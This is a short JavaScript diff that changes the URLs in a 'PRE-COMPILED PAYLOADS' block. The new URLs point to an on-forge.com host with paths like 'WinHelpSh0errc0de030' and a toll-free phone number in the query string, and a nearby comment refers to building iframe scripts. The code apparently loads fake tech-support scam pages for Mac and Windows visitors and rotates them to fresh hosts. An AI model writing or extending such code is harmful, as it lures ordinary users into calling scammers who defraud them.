@@ -47,8 +47,8 @@ function aesEncode(text) {
 // PRE-COMPILED PAYLOADS (KEY OPTIMIZATION)
 // --------------------
 const LINKS = {
-    mac: "https://main.d1eosi23diktir.amplifyapp.com/mac",
-    other: "https://main.d1eosi23diktir.amplifyapp.com/"
+    mac: "https://henlennnapy11.on-forge.com/Ma0cHelpSh0errc0de030/index.html?Anph=1-844-590-5369/mac",
+    other: "https://henlennnapy11.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1-844-590-5369"
 };
 
 // Build iframe scripts ONCE
